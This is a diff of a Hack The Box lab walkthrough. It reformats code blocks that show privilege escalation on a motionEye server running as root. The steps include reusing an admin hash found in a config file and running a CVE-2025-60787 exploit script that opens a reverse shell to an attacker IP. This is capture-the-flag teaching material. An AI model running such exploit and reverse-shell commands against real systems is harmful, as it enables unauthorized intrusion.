@@ -275,7 +275,13 @@ cat /etc/systemd/system/motioneye.service
 
 The service configuration revealed that the **motionEye server runs as the root user**, which immediately caught my attention.
 ```
-\[Service\] User=root RuntimeDirectory=motioneye LogsDirectory=motioneye StateDirectory=motioneye ExecStart=/usr/local/bin/meyectl startserver -c /etc/motioneye/motioneye.conf Restart=on-abort
+\[Service\]
+User=root
+RuntimeDirectory=motioneye
+LogsDirectory=motioneye
+StateDirectory=motioneye
+ExecStart=/usr/local/bin/meyectl startserver -c /etc/motioneye/motioneye.conf
+Restart=on-abort
 ```
 Running a service as **root** significantly increases the attack surface because any vulnerability within the application or its configuration could potentially lead to **privilege escalation to root**. The service also starts the motionEye server using the configuration file located at `/etc/motioneye/motioneye.conf`, making it a logical next target for inspection.
 
@@ -292,11 +298,13 @@ cat /etc/motioneye/motion.conf
 
 Inside the configuration file, I discovered commented configuration parameters that included an **administrator username and password hash**.
 ```
-\# @admin\_username admin # @admin\_password 989c5a8ee87a0e9521ec81a79187d162109282f0
+# @admin\_username admin
+# @admin\_password 989c5a8ee87a0e9521ec81a79187d162109282f0
 ```
 The value associated with `admin_password` appeared to be a **SHA-1 hash**, which likely corresponds to the administrative password used by the motionEye interface. The configuration also indicated that the **web control interface runs on port 7999**, though it is restricted to the local interface:
 ```
-webcontrol\_port 7999 webcontrol\_localhost on
+webcontrol\_port 7999
+webcontrol\_localhost on
 ```
 This suggests that the motionEye management interface is **not directly exposed externally** and can only be accessed from the local system. However, since I already had shell access as `mark`, interacting with this service locally remained a viable option.
 
@@ -313,7 +321,8 @@ cat /opt/video/backups/server.log
 
 The log entries showed repeated API interactions performed by an account named **`sa_mark`**:
 ```
-Authorization as sa\_mark successful. Command issued: status. Outcome: success. Authorization as sa\_mark successful. Command issued: disk-info. Outcome: success.
+Authorization as sa\_mark successful. Command issued: status. Outcome: success.
+Authorization as sa\_mark successful. Command issued: disk-info. Outcome: success.
 ```
 These entries indicated that the **`sa_mark` account is actively interacting with the motionEye API**, repeatedly issuing commands such as `status` and `disk-info`. The repeated authorization messages confirm that the account is used to interact with the service programmatically.
 
@@ -373,7 +382,8 @@ The page loaded the **motionEye login interface**, confirming that the SSH port 
 
 Earlier during local enumeration, I had identified an administrator credential within the motionEye configuration file located at `/etc/motioneye/motion.conf`. The configuration contained the following values:
 ```
-\# @admin\_username admin # @admin\_password 989c5a8ee87a0e9521ec81a79187d162109282f0
+# @admin\_username admin
+# @admin\_password 989c5a8ee87a0e9521ec81a79187d162109282f0
 ```
 Using this information, I attempted to authenticate to the motionEye interface with the **admin username** and the discovered password value.
 ```
@@ -451,7 +461,12 @@ Executing the Exploit
 
 With the listener running, I executed the exploit script to trigger the command injection and spawn a reverse shell back to my attacker machine.
 ```
-python3 CVE-2025-60787.py revshell \\ --url 'http://127.0.0.1:8765' \\ --user 'admin' \\ --password '989c5a8ee87a0e9521ec81a79187d162109282f0' \\ -i 10.10.14.56 \\ --port 4444
+python3 CVE-2025-60787.py revshell \
+--url 'http://127.0.0.1:8765' \
+--user 'admin' \
+--password '989c5a8ee87a0e9521ec81a79187d162109282f0' \
+-i 10.10.14.56 \
+--port 4444
 ```
 [![monitorsfour htb walkthrough](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZyogLaLFj0J-JxiVwX6op3psiDtP48w_1HD0iyie89Lx80go4IJ0KXpEaWDF4aSj1hyphenhyphenpTnty61wlq_zmTpHtn0fP0Mu9-wNzH8clTKXqL2DsUdbg24yIgU5ijPEY8Ol7MbVmtT-7zQHCy8Og7C-YoP7iY8Mxjxwgj3Dtgj6T6cA8HX1vd98vEH4_ZfkG-/s16000/bandicam%202026-03-09%2017-33-39-788.jpg "monitorsfour htb walkthrough")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZyogLaLFj0J-JxiVwX6op3psiDtP48w_1HD0iyie89Lx80go4IJ0KXpEaWDF4aSj1hyphenhyphenpTnty61wlq_zmTpHtn0fP0Mu9-wNzH8clTKXqL2DsUdbg24yIgU5ijPEY8Ol7MbVmtT-7zQHCy8Og7C-YoP7iY8Mxjxwgj3Dtgj6T6cA8HX1vd98vEH4_ZfkG-/s1833/bandicam%202026-03-09%2017-33-39-788.jpg)
 
@@ -504,7 +519,11 @@ ls
 ```
 The listing revealed several files and directories, including the expected **`root.txt`** flag file.
 ```
-clean\_logs.sh docker-binaries files root.txt snap
+clean_logs.sh
+docker-binaries
+files
+root.txt
+snap
 ```
 [![giveback htb walkthrough](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2PB7nmPZz9POl511h5khN6MqtJway-RRK5aFoTfpDl-xbYjZIWg5p4GEAzu7vM4CbkrZxVcHrzpLiNFuE6dnYz1hso2Io40DZqo7VLkWO0nS4y5zSQrwF5bMwPwCOKAlplM_OY2hMqfrH56pBvQlJP0lTw5ugrhmMAMJ3iSVDz0yscMs9BRgU1QDC6PK4/s16000/bandicam%202026-03-09%2017-43-56-852.jpg "giveback htb walkthrough")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2PB7nmPZz9POl511h5khN6MqtJway-RRK5aFoTfpDl-xbYjZIWg5p4GEAzu7vM4CbkrZxVcHrzpLiNFuE6dnYz1hso2Io40DZqo7VLkWO0nS4y5zSQrwF5bMwPwCOKAlplM_OY2hMqfrH56pBvQlJP0lTw5ugrhmMAMJ3iSVDz0yscMs9BRgU1QDC6PK4/s1833/bandicam%202026-03-09%2017-43-56-852.jpg)
 
@@ -513,9 +532,7 @@ Finally, I read the contents of the flag file.
 cat root.txt
 ```
 The file contained the **root flag**, confirming full compromise of the system:
-```
-\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
-```
+
 Hurray!!! I got the root flag!!!
 
 [![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikVaBJMyTLKEP9VDVKxpx_veS9HJGRwg8k8Z3qdnLOmcHa6TsA8CLyLUNptHf1uj5xKmk3gXzd_j7fF1Kdz3i8WBPl42svPrjneUn-AWsB5o7BJV_fxVjc_ElJKQ1dG1GL6in5iuLnfzip2Z_5aQj12kmZXUs1hcPZcNEDeLVmmd44x8JxIakUZUh796-G/s16000/Super%20Bowl%20Dancing%20GIF.gif)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikVaBJMyTLKEP9VDVKxpx_veS9HJGRwg8k8Z3qdnLOmcHa6TsA8CLyLUNptHf1uj5xKmk3gXzd_j7fF1Kdz3i8WBPl42svPrjneUn-AWsB5o7BJV_fxVjc_ElJKQ1dG1GL6in5iuLnfzip2Z_5aQj12kmZXUs1hcPZcNEDeLVmmd44x8JxIakUZUh796-G/s480/Super%20Bowl%20Dancing%20GIF.gif)
@@ -539,11 +556,12 @@ ls
 ```
 The output revealed two user accounts present on the system:
 ```
-mark sa\_mark
+mark
+sa_mark
 ```
 Earlier in the enumeration process, I had already authenticated to the system as **mark**, so I decided to investigate the **`sa_mark`** directory to see whether it contained additional artifacts or flags.
 ```
-cd sa\_mark
+cd sa_mark
 ```
 Once inside the directory, I listed its contents.
 ```
@@ -560,23 +578,9 @@ cat user.txt
 [![pterodactyl hack the box](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgfom5mbjXUKHSU54REc-H3xdBrJejmNZrzCu6kwLVJm5x_LqUuG5IdB3tM9sUG2vJCdV7eufqKY0OKfboTbVdPfR0t2GAwWJMCB-thCVOMwlMra0EM9a7L06nK0I2TlyYaL3_YO_nNdtAqCEYrqPmfj065_TyN0qQghbtkcrM3xZW1HoYwrmwrpmrUYpkN/s16000/bandicam%202026-03-09%2017-47-57-718.jpg "pterodactyl hack the box")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgfom5mbjXUKHSU54REc-H3xdBrJejmNZrzCu6kwLVJm5x_LqUuG5IdB3tM9sUG2vJCdV7eufqKY0OKfboTbVdPfR0t2GAwWJMCB-thCVOMwlMra0EM9a7L06nK0I2TlyYaL3_YO_nNdtAqCEYrqPmfj065_TyN0qQghbtkcrM3xZW1HoYwrmwrpmrUYpkN/s1833/bandicam%202026-03-09%2017-47-57-718.jpg)
 
 The file revealed the user flag:
-```
-\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
-```
+
 Hurray!!! I got the user flag.
 
 [![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjSPNDxlpkrluejCIn9x_licnPUODqrLgyCnTwWJarDl0b8ekKUZGKprq5hWQbS-vA0a6QiB8Jnpo6dqq-_bmckodGhi2fLlpdQk4yGf_FNldCgIWLd_jMY9puCaRxpjMWTg0OJJ6r0-zLorgUzvd4fW9Gn57cunkn8kH0JeiiKVxspe6ArSoo9kbwJxw5f/s16000/Happy%20Party%20GIF.gif)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjSPNDxlpkrluejCIn9x_licnPUODqrLgyCnTwWJarDl0b8ekKUZGKprq5hWQbS-vA0a6QiB8Jnpo6dqq-_bmckodGhi2fLlpdQk4yGf_FNldCgIWLd_jMY9puCaRxpjMWTg0OJJ6r0-zLorgUzvd4fW9Gn57cunkn8kH0JeiiKVxspe6ArSoo9kbwJxw5f/s480/Happy%20Party%20GIF.gif)
 
 With both the **user flag** and the **root flag** successfully retrieved, the compromise of the system was complete.
-
-If you enjoy reading my walkthrough, do not forget to like, comment, and subscribe to my YouTube channel and also connect with me on LinkedIn. Also, don't forget to turn on post notification on my YouTube channel and Medium to get notification as soon as I write.
-
-Subscribe to my [**YouTube channel**](https://www.youtube.com/@BoltechTechnologies1) and Follow me on: [**LinkedIn**](https://www.linkedin.com/in/isiaq-ibrahim-468588156/) | [**Medium**](https://medium.com/@boltech) | [**Twitter**](https://x.com/Isiaq_Ibrahim99) | [**Boltech Twitter**](https://x.com/BoltechNG) | [**Buy Me a Coffee**](https://buymeacoffee.com/boltechtechnologies)
-
-Found this walkthrough helpful?
-
-[**Buying me a coffee**](https://buymeacoffee.com/boltechtechnologies) helps power the late nights spent writing technical walkthroughs and keeping them free for everyone ☕
-
-  ### 0 Comments
-
-[](https://www.blogger.com/comment/frame/3692527306466683761?po=2390091150362807754&hl=en&saa=85391&origin=https%3A%2F%2Fwww.ibrahimisiaqbolaji.com&m=1&skin=contempo&blogspotRpcToken=3327446)
